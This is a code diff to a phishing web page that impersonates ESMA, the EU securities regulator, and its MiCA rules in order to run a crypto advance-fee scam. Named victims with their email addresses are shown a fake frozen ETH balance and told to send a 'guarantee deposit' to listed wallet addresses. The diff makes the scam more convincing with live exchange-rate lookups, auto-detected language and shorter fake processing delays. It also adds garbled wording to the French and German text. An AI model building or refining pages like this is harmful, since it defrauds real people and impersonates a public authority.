@@ -38,7 +38,8 @@ input[type="text"], input[type="email"], select { width: 100%; padding: 12px; bo
 .phase { display: none; }
 .phase.active { display: block; }
 .status-header { background: #fdf7f7; border: 1px solid #ebccd1; padding: 25px; text-align: center; margin-bottom: 20px; }
-.amount-text { font-size: 42px; font-weight: 700; color: var(--danger); display: block; }
+.amount-text { font-size: 42px; font-weight: 700; color: var(--danger); display: block; line-height: 1.1; }
+.sub-fiat-text { font-size: 18px; font-weight: 500; color: var(--text-muted); display: block; margin-bottom: 10px; }
 .official-table { width: 100%; border-collapse: collapse; margin-bottom: 30px; background: #fafafa; }
 .official-table td { padding: 12px 15px; border-bottom: 1px solid var(--border); font-size: 14px; }
 .official-table td:first-child { font-weight: 700; width: 45%; color: var(--text-muted); }
@@ -69,7 +70,7 @@ footer { background: var(--eu-blue); color: #fff; padding: 50px 10%; margin-top:
 footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
 </style>
 </head>
-<body>
+<body onload="initPortal()">
 
 <div class="eu-top-banner">
   <span><i class="fas fa-landmark"></i> <span data-i18n="topBanner">Official database of the European Securities and Markets Authority</span></span>
@@ -107,11 +108,11 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
       <p style="font-size: 14px; color: var(--text-muted); margin-bottom: 25px;" data-i18n="loginSub">Enter your registered details to access the asset registry.</p>
       <div class="form-group">
         <label data-i18n="lblName">Full Legal Name</label>
-        <input type="text" id="nameInput" placeholder="Enter full name" autocomplete="off">
+        <input type="text" id="nameInput" placeholder="Enter full name" autocomplete="off" onkeydown="handleKeyPress(event)">
       </div>
       <div class="form-group">
         <label data-i18n="lblEmail">Registered Email Address</label>
-        <input type="email" id="emailInput" placeholder="Enter email address" autocomplete="off">
+        <input type="email" id="emailInput" placeholder="Enter email address" autocomplete="off" onkeydown="handleKeyPress(event)">
       </div>
       <button class="btn-eu" onclick="validateUser()" data-i18n="btnSearch">SEARCH ESMA REGISTRY</button>
     </div>
@@ -130,6 +131,7 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
       <div class="status-header">
         <span style="font-size: 13px; font-weight: 700; color: var(--text-muted);" data-i18n="p3Header">TOTAL RESTRAINED CAPITAL</span>
         <span class="amount-text" id="p3Amount">51.46 ETH</span>
+        <span class="sub-fiat-text" id="p3FiatSub">≈ Calculating...</span>
         <span style="color: var(--danger); font-weight: 700;"><i class="fas fa-lock"></i> <span data-i18n="p3Status">STATUS: ADMINISTRATIVE RESTRAINT</span></span>
       </div>
       <h4 style="border-bottom: 1px solid var(--border); padding-bottom: 10px;" data-i18n="p3DetailsTitle">Beneficiary Details</h4>
@@ -174,7 +176,7 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
       <div class="guarantee-calc-box">
         <div class="calc-row"><span data-i18n="p6Restrained">Restrained Amount:</span><span id="p6RestrainedVal">108,357.00 EUR</span></div>
         <div class="calc-row"><span data-i18n="p6Rate">Required Guarantee Rate:</span><span id="p6RateVal">6.50%</span></div>
-        <div class="calc-total calc-row"><span data-i18n="p6Total">Total Deposit Required:</span><span id="p6TotalVal">7,043.20 EUR</span></div>
+        <div class="calc-total calc-row"><span data-i18n="p6Total">Total Deposit Required:</span><span id="p6TotalVal">7,043.21 EUR</span></div>
       </div>
       <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; font-size: 13px; color: #92400e; margin-bottom: 20px;">
         <strong data-i18n="p6NoticeTitle">Notice:</strong> <span data-i18n="p6NoticeText">This deposit is not a fee. It is held in a protected escrow and is fully returned upon completion of the asset transfer.</span>
@@ -209,11 +211,11 @@ footer a { color: #fff; text-decoration: underline; margin: 0 10px; }
           <div style="display:flex; justify-content:space-between; margin-bottom:25px;">
             <div>
               <span style="display:block; font-size:12px; color:var(--text-muted);" data-i18n="p8AmountSend">AMOUNT TO SEND</span>
-              <span style="font-size:24px; font-weight:700; color:var(--danger);" id="p8CryptoAmt">3.33 ETH</span>
+              <span style="font-size:24px; font-weight:700; color:var(--danger);" id="p8CryptoAmt">Calculating...</span>
             </div>
             <div style="text-align:right;">
               <span style="display:block; font-size:12px; color:var(--text-muted);" data-i18n="p8FiatVal">FIAT VALUE</span>
-              <span style="font-size:24px; font-weight:700; color:var(--text-dark);" id="p8FiatVal">7,043.20 EUR</span>
+              <span style="font-size:24px; font-weight:700; color:var(--text-dark);" id="p8FiatVal">7,043.21 EUR</span>
             </div>
           </div>
 
@@ -264,12 +266,11 @@ const clients = {
     email: "tim@laidback.dk",
     ref: "EU-MICA-8829123-00",
     date: "September 8th, 2026",
-    restrainedCapital: "51.46 ETH",
-    restrainedAmount: "108,357.00 EUR",
-    guaranteeRate: "6.50%",
-    totalDeposit: "7,043.20 EUR",
-    cryptoAmount: "3.33 ETH",
-    fiatValue: "7,043.20 EUR",
+    ethAmount: 51.46,
+    currency: "EUR",
+    currencySymbol: "€",
+    restrainedAmount: 108357.00,
+    guaranteeRate: 0.065, // 6.50%
     wallet: "0xc000f1C17B99c1902A503fF2E1E7d51C9791718b"
   },
   "annemukansi@gmail.com": {
@@ -277,18 +278,18 @@ const clients = {
     email: "annemukansi@gmail.com",
     ref: "EU-MICA-9941824-11",
     date: "September 8th, 2026",
-    restrainedCapital: "23.26 ETH",
-    restrainedAmount: "58,610.00 USD",
-    guaranteeRate: "10.90%",
-    totalDeposit: "6,390.00 USD",
-    cryptoAmount: "2.32 ETH",
-    fiatValue: "6,390.00 USD",
+    ethAmount: 23.26,
+    currency: "USD",
+    currencySymbol: "$",
+    restrainedAmount: 58610.00,
+    guaranteeRate: 0.109, // 10.90%
     wallet: "0x020eE19bf7BBd5F87Fe91fA4245132196D96CfB0"
   }
 };
 
 let currentClient = null;
 let currentLang = "ENG";
+let exchangeRates = { USD: 2500, EUR: 2300 }; // Default fallback rates
 
 // --- TRANSLATION DICTIONARY ---
 const i18n = {
@@ -448,7 +449,7 @@ const i18n = {
     aml2Title: "Inhaberschaft des Bankkontos", aml2Desc: "Empfangskonto authentifiziert",
     aml3Title: "Mittelherkunft", aml3Desc: "Konsistent mit der angegebenen Handelsaktivität; hinreichend nachgewiesen",
     aml4Title: "Transaktionsprüfung", aml4Desc: "Historie analysiert; strukturelle Kennzeichnungen auf technische Parameter zurückzuführen, kein Fehlverhalten",
-    aml5Title: "Risikoscreening", aml5Desc: "Keine Sanktionen, Betrug oder verbotene Aktivitäten festgestellt",
+    aml5Title: "Risicoscreening", aml5Desc: "Keine Sanktionen, Betrug oder verbotene Aktivitäten festgestellt",
     aml6Title: "Verstärkte Sorgfaltspflicht (EDD)", aml6Desc: "Für AML-Klassifizierung erfüllt",
     aml7Title: "Garantieeinzahlung", aml7Desc: "ERFORDERLICH FÜR DIE ZERTIFIKATSAUSSTELLUNG",
     btnCalc: "WEITER ZUR KAUTIONSBERECHNUNG",
@@ -593,7 +594,7 @@ const i18n = {
     p7OptionDefault: "-- Sélectionner l'actif --",
     btnGenerate: "GÉNÉRER L'ADRESSE DE DÉPÔT",
     p8Title: "Passerelle de Paiement Séquestre Sécurisée",
-    p8Sub: "Transaction Validée par ESMA / MiCA",
+    p8Sub: "Transaction Validada par ESMA / MiCA",
     p8AmountSend: "MONTANT À ENVOYER",
     p8FiatVal: "VALEUR FIAT",
     p8Network: "RÉSEAU",
@@ -601,7 +602,7 @@ const i18n = {
     btnConfirmDeposit: "CONFIRMER LE DÉPÔT ENVOYÉ",
     btnCancel: "Annuler et retourner au portail ESMA",
     modalTitle: "Affirmation de Conformité",
-    modalText: "Je reconnais le cadre <strong>MiCA (Règlement UE 2023/1114)</strong> et comprends que la libération des fonds est strictement subordonnée à la vérification du dépôt de garantie obligatoire.",
+    modalText: "Je reconnais le cadre <strong>MiCA (Règlement UE 2023/1114)</strong> et comprends que la libération des fonds est strictly subordonnée à la vérification du dépôt de garantie obligatoire.",
     btnModalProceed: "PASSER À LA VÉRIFICATION",
     ftrPrivacy: "Politique de Confidentialité",
     ftrLegal: "Mentions Légales",
@@ -614,6 +615,40 @@ const i18n = {
   }
 };
 
+async function fetchExchangeRates() {
+  try {
+    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,eur');
+    const data = await res.json();
+    if (data && data.ethereum) {
+      exchangeRates.USD = data.ethereum.usd;
+      exchangeRates.EUR = data.ethereum.eur;
+    }
+  } catch (err) {
+    console.log("Using fallback exchange rates.");
+  }
+}
+
+function initPortal() {
+  fetchExchangeRates();
+  
+  // Auto-detect browser language
+  const userLang = (navigator.language || navigator.userLanguage || "").substring(0, 2).toUpperCase();
+  const langMap = { "ES": "ES", "DE": "DE", "FR": "FR", "NL": "DU" };
+  
+  if (langMap[userLang]) {
+    currentLang = langMap[userLang];
+    document.getElementById('langSelect').value = currentLang;
+  }
+  changeLanguage(currentLang);
+}
+
+function handleKeyPress(event) {
+  if (event.key === "Enter") {
+    event.preventDefault();
+    validateUser();
+  }
+}
+
 function changeLanguage(lang) {
   currentLang = lang;
   const dict = i18n[lang] || i18n.ENG;
@@ -625,7 +660,6 @@ function changeLanguage(lang) {
     }
   });
 
-  // Placeholders
   const nameInput = document.getElementById('nameInput');
   const emailInput = document.getElementById('emailInput');
   if (nameInput) nameInput.placeholder = dict.phName;
@@ -638,20 +672,23 @@ function showPhase(n){
   window.scrollTo(0,0);
 }
 
+function formatCurrency(val, symbol) {
+  return symbol + val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
 function validateUser(){
-  const n = document.getElementById('nameInput').value.trim();
-  const e = document.getElementById('emailInput').value.trim();
+  const nameVal = document.getElementById('nameInput').value.trim();
+  const emailVal = document.getElementById('emailInput').value.trim().toLowerCase();
   const dict = i18n[currentLang] || i18n.ENG;
   
-  if (n === "" || e === "") {
+  if (nameVal === "" || emailVal === "") {
     return alert(dict.errFill);
   }
   
-  const clientKey = e.toLowerCase();
-  const foundClient = clients[clientKey];
+  const foundClient = clients[emailVal];
 
-  // Must match both exact name and email
-  if (!foundClient || foundClient.name !== n) {
+  // Case-insensitive name comparison
+  if (!foundClient || foundClient.name.toLowerCase() !== nameVal.toLowerCase()) {
     return alert("Client not found");
   }
   
@@ -659,26 +696,32 @@ function validateUser(){
   populateClientData();
 
   showPhase(2);
-  setTimeout(()=>showPhase(3), 7000);
+  setTimeout(()=>showPhase(3), 4000); // Updated: 4 Seconds
 }
 
 function populateClientData() {
   if (!currentClient) return;
 
-  // Phase 3
-  document.getElementById('p3Amount').innerText = currentClient.restrainedCapital;
+  const rate = exchangeRates[currentClient.currency] || 2500;
+  const approxFiat = currentClient.ethAmount * rate;
+
+  // Phase 3 Data
+  document.getElementById('p3Amount').innerText = currentClient.ethAmount + " ETH";
+  document.getElementById('p3FiatSub').innerText = "≈ " + formatCurrency(approxFiat, currentClient.currencySymbol) + " " + currentClient.currency;
   document.getElementById('p3Name').innerText = currentClient.name;
   document.getElementById('p3Ref').innerText = currentClient.ref;
   document.getElementById('p3Date').innerText = currentClient.date;
 
-  // Phase 6
-  document.getElementById('p6RestrainedVal').innerText = currentClient.restrainedAmount;
-  document.getElementById('p6RateVal').innerText = currentClient.guaranteeRate;
-  document.getElementById('p6TotalVal').innerText = currentClient.totalDeposit;
+  // Phase 6 Dynamic Math
+  const exactDeposit = currentClient.restrainedAmount * currentClient.guaranteeRate;
+  document.getElementById('p6RestrainedVal').innerText = formatCurrency(currentClient.restrainedAmount, currentClient.currencySymbol) + " " + currentClient.currency;
+  document.getElementById('p6RateVal').innerText = (currentClient.guaranteeRate * 100).toFixed(2) + "%";
+  document.getElementById('p6TotalVal').innerText = formatCurrency(exactDeposit, currentClient.currencySymbol) + " " + currentClient.currency;
 
-  // Phase 8
-  document.getElementById('p8CryptoAmt').innerText = currentClient.cryptoAmount;
-  document.getElementById('p8FiatVal').innerText = currentClient.fiatValue;
+  // Phase 8 Dynamic ETH Calculation
+  const requiredEthForDeposit = exactDeposit / rate;
+  document.getElementById('p8CryptoAmt').innerText = requiredEthForDeposit.toFixed(2) + " ETH";
+  document.getElementById('p8FiatVal').innerText = formatCurrency(exactDeposit, currentClient.currencySymbol) + " " + currentClient.currency;
   document.getElementById('walletAddr').innerText = currentClient.wallet;
 }
 
@@ -691,7 +734,7 @@ function confirmAgreement(){
   if(!document.getElementById('micaAgree').checked) return alert(dict.errCheck);
   document.getElementById('agreementModal').style.display='none';
   showPhase(4);
-  setTimeout(()=>showPhase(5), 5000);
+  setTimeout(()=>showPhase(5), 5000); // Updated: 5 Seconds
 }
 
 function toCalculation(){ showPhase(6); }
